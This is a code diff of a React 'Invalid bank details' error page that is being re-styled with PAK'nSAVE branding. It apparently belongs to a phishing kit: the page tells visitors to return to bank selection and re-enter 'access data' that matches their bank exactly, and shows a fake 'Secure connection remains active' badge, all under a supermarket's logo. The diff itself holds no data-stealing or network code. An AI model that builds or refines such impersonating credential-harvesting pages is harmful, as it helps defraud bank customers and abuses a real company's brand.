@@ -1,6 +1,5 @@
 "use client";
 
-import { useState } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { useSettings } from "@/contexts/SettingsContext";
 
@@ -34,12 +33,11 @@ export function InvalidBankClient({ sessionId }: Props) {
   }
 
   return (
-    <div className="bg-[#f8fafc] min-h-screen relative z-50 overflow-hidden flex flex-col">
-      {/* Ambient Background Glows */}
-      <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] rounded-full bg-red-500/5 blur-[100px] animate-[pulse_6s_ease-in-out_infinite]" />
-      <div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] rounded-full bg-[#f7a600]/5 blur-[100px] animate-[pulse_8s_ease-in-out_infinite_alternate]" />
+    <div className="relative z-50 flex min-h-screen flex-col overflow-hidden">
+      <div className="absolute left-[-12%] top-[-10%] h-[420px] w-[420px] rounded-full bg-[#ffb400]/10 blur-[120px]" />
+      <div className="absolute bottom-[-12%] right-[-10%] h-[360px] w-[360px] rounded-full bg-[#ffd500]/8 blur-[110px]" />
 
-      <main className="flex-1 flex flex-col items-center justify-center p-4 w-full relative z-10">
+      <main className="relative z-10 flex flex-1 flex-col items-center justify-center p-4 w-full">
         {!sessionId ? (
           <div className="flex justify-center relative z-10 w-full">
             <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600 shadow-sm w-full max-w-sm">
@@ -47,46 +45,52 @@ export function InvalidBankClient({ sessionId }: Props) {
             </p>
           </div>
         ) : (
-          <div className="w-full bg-white/90 backdrop-blur-xl rounded-[28px] shadow-[0_20px_60px_-15px_rgba(227,6,19,0.15)] p-8 md:p-10 flex flex-col items-center relative overflow-hidden border border-white/60 mx-auto max-w-[440px]">
-            {/* Top Security Banner - Red */}
-            <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-[#f7a600] via-[#7ec3eb] to-[#003b8f] bg-[length:200%_100%] animate-[pulse_3s_ease-in-out_infinite]" />
-            
-            {/* Error Icon Container */}
-            <div className="relative flex items-center justify-center w-28 h-28 mb-6 mt-2">
-              <div className="absolute inset-0 bg-[#f7a600]/8 rounded-full animate-ping" style={{ animationDuration: '3s' }} />
-              <div className="absolute inset-0 rounded-full border-[4px] border-[#f7a600]/20" />
-              
-              <div className="bg-[#f7a600]/10 p-4 rounded-full">
-                <svg className="w-12 h-12 text-[#f7a600]" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-                </svg>
+          <div className="pak-form-card fade-in mx-auto w-full max-w-[760px]">
+            <div className="pak-form-inner px-6 pb-8 pt-8 sm:px-10 sm:pb-10 sm:pt-10">
+              <div className="mx-auto flex w-full max-w-[560px] items-start justify-between gap-4">
+                <div>
+                  <h2 className="pak-form-title max-w-[12ch]">Invalid bank details</h2>
+                  <p className="pak-form-subtitle mt-3 max-w-[34rem]">
+                    The details entered could not be verified. Review the information carefully and try again.
+                  </p>
+                </div>
+                <img
+                  src="/form-assets/paknsave-logo-form.png"
+                  alt="PAK'nSAVE"
+                  className="h-14 w-14 shrink-0 object-contain sm:h-16 sm:w-16"
+                />
               </div>
-            </div>
 
-            <h2 className="text-[24px] font-bold text-slate-800 mb-3 text-center tracking-tight">
-              Invalid bank details
-            </h2>
-            
-            <p className="text-center text-[15px] font-medium text-slate-600 mb-8 leading-relaxed">
-              The bank details you entered could not be verified. Check your information and try again.
-            </p>
+              <div className="mx-auto mt-7 flex w-full max-w-[560px] flex-col items-center rounded-[28px] border border-[#ffd95c]/30 bg-[radial-gradient(circle_at_top,rgba(255,183,0,0.15),transparent_55%),linear-gradient(180deg,rgba(18,18,16,0.96),rgba(10,10,9,0.98))] px-6 py-8 text-center shadow-[inset_0_1px_0_rgba(255,240,160,0.08)]">
+                <div className="relative mb-6 flex h-28 w-28 items-center justify-center">
+                  <div className="absolute inset-0 rounded-full border border-[#ffd95c]/20" />
+                  <div className="absolute inset-[12px] rounded-full border border-[#ffb400]/20" />
+                  <div className="absolute inset-[20px] rounded-full bg-[#ffb400]/10 blur-md" />
+                  <div className="rounded-full border border-[#ffd95c]/30 bg-[#ffb400]/10 p-4">
+                    <svg className="h-12 w-12 text-[#ffcc29]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                    </svg>
+                  </div>
+                </div>
 
-            <button
-              onClick={() => void handleRetry()}
-              className="w-full bg-[#003b8f] hover:bg-[#002f72] text-white font-semibold py-3.5 px-6 rounded-xl transition-all shadow-[0_4px_14px_rgba(0,59,143,0.25)] hover:shadow-[0_6px_20px_rgba(0,59,143,0.35)] flex items-center justify-center gap-2"
-            >
-              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
-              </svg>
-              Try again
-            </button>
+                <p className="mb-8 max-w-[34rem] text-base font-medium leading-7 text-white/82">
+                  Return to the bank selection and enter your details again. Make sure the access data matches your bank exactly.
+                </p>
 
-            {/* Footer Security Badge */}
-            <div className="mt-8 flex items-center justify-center gap-2 text-[13px] font-semibold text-slate-500 bg-slate-50 px-4 py-2 rounded-full border border-slate-200">
-              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-              </svg>
-              Secure connection
+                <button
+                  onClick={() => void handleRetry()}
+                  className="pak-form-button min-h-[4.25rem] w-full max-w-[24rem] px-6 text-xl"
+                >
+                  Try again
+                </button>
+
+                <div className="mt-8 pak-form-security justify-center text-center">
+                  <svg className="h-8 w-8 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                    <path d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2Zm10-10V7a4 4 0 0 0-8 0v4h8Z" strokeLinecap="round" strokeLinejoin="round" />
+                  </svg>
+                  <span>Secure connection remains active</span>
+                </div>
+              </div>
             </div>
           </div>
         )}
